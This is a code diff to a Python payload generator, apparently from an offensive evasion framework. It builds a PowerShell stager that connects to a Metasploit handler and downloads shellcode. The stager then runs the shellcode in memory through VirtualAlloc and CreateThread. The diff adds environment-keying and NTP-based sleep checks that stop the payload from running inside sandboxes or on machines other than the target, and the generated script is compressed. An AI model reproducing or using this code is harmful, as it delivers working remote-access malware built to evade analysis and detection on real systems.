@@ -32,16 +32,54 @@ class PayloadModule:
         # optional
         self.required_options = {
             "LHOST" : ["", "IP of the Metasploit handler"],
-            "LPORT" : ["4444", "Port of the Metasploit handler"]
-                                }
+            "LPORT" : ["4444", "Port of the Metasploit handler"],
+            "HOSTNAME"       : ["X", "Optional: Required system hostname"],
+            "DOMAIN"         : ["X", "Optional: Required internal domain"],
+            "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
+            "USERNAME"       : ["X", "Optional: The required user account"],
+            "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]}
+
+    def system_checks(self):
+        check_code = ''
+        num_ends_required = 0
+
+        if self.required_options["HOSTNAME"][0].lower() != "x":
+            check_code += "if($env:computername -eq \"" + self.required_options["HOSTNAME"][0].lower() + "\") {\n"
+            num_ends_required += 1
+
+        if self.required_options["DOMAIN"][0].lower() != "x":
+            check_code += "if((Get-WMIObject -Class Win32_ComputerSystem).Domain -eq \"" + self.required_options["DOMAIN"][0].lower() + "\") {\n"
+            num_ends_required += 1
+
+        if self.required_options["USERNAME"][0].lower() != "x":
+            check_code += "if($env:username -eq \"" + self.required_options["USERNAME"][0].lower() + "\") {\n"
+            num_ends_required += 1
+
+        if self.required_options["PROCESSORS"][0].lower() != "x":
+            check_code += "if((Get-WMIObject -Class Win32_Processor).NumberOfLogicalProcessors -ge " + self.required_options["PROCESSORS"][0].lower() + ") {\n"
+            num_ends_required += 1
+
+        if self.required_options["SLEEP"][0].lower() != "x":
+            check_code += "[Byte[]]$NTPTransmit=,1*48;$NTPTransmit[0]=0x1B;[Byte[]]$secondTransmit=,1*48;$secondTransmit[0]=0x1B;$noAccess=$false;"
+            check_code += "Try{$Socket=New-Object Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Dgram,[Net.Sockets.ProtocolType]::Udp);$Socket.Connect('us.pool.ntp.org',123);[Void]$Socket.Send($NTPTransmit);[Void]$Socket.Receive($NTPTransmit)}catch{$noAccess=$true};"
+            check_code += "$runTotal=0;ForEach($Index in $NTPTransmit[40..43]){$runTotal=$runTotal*256+$Index};$firstTime=(New-Object DateTime(1900,1,1,0,0,0,[DateTimeKind]::Utc)).AddMilliseconds([UInt64]($runTotal*1000)).Second;"
+            check_code += "Start-Sleep -s " + self.required_options["SLEEP"][0] + ";"
+            check_code += "Try{$NewSock=New-Object Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Dgram,[Net.Sockets.ProtocolType]::Udp);$NewSock.Connect('us.pool.ntp.org',123);[Void]$NewSock.Send($secondTransmit);[Void]$NewSock.Receive($secondTransmit);$NewSock.Close()}catch{$noAccess=$true};"
+            check_code += "$runTotal=0;ForEach($Index in $secondTransmit[40..43]){$runTotal=$runTotal*256+$Index}\n"
+            check_code += "if ((New-Object DateTime(1900,1,1,0,0,0,[DateTimeKind]::Utc)).AddMilliseconds([UInt64]($runTotal*1000)).Second - $firstTime -ge " + self.required_options["SLEEP"][0] + " -or $noAccess) {\n"
+            num_ends_required += 1
+
+        return check_code, num_ends_required
 
     def generate(self):
-
+        checks, num_ends = self.system_checks()
         baseString = """$c = @"
 [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr w, uint x, uint y, uint z);
 [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr u, uint v, IntPtr w, IntPtr x, uint y, IntPtr z);
-"@
-try{$s = New-Object System.Net.Sockets.Socket ([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::Tcp)
+"@\n"""
+
+        baseString += checks
+        baseString += """try{$s = New-Object System.Net.Sockets.Socket ([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::Tcp)
 $s.Connect('%s', %s) | out-null; $p = [Array]::CreateInstance("byte", 4); $x = $s.Receive($p) | out-null; $z = 0
 $y = [Array]::CreateInstance("byte", [BitConverter]::ToInt32($p,0)+5); $y[0] = 0xBF
 while ($z -lt [BitConverter]::ToInt32($p,0)) { $z += $s.Receive($y,$z+5,1,[System.Net.Sockets.SocketFlags]::None) }
@@ -49,6 +87,9 @@ for ($i=1; $i -le 4; $i++) {$y[$i] = [System.BitConverter]::GetBytes([int]$s.Han
 $t = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru; $x=$t::VirtualAlloc(0,$y.Length,0x3000,0x40)
 [System.Runtime.InteropServices.Marshal]::Copy($y, 0, [IntPtr]($x.ToInt32()), $y.Length)
 $t::CreateThread(0,0,$x,0,0,0) | out-null; Start-Sleep -Second 86400}catch{}""" %(self.required_options["LHOST"][0], self.required_options["LPORT"][0])
+
+        baseString += '}\n' * num_ends
+        print(baseString)
 
         encoded = evasion_helpers.deflate(baseString)
 
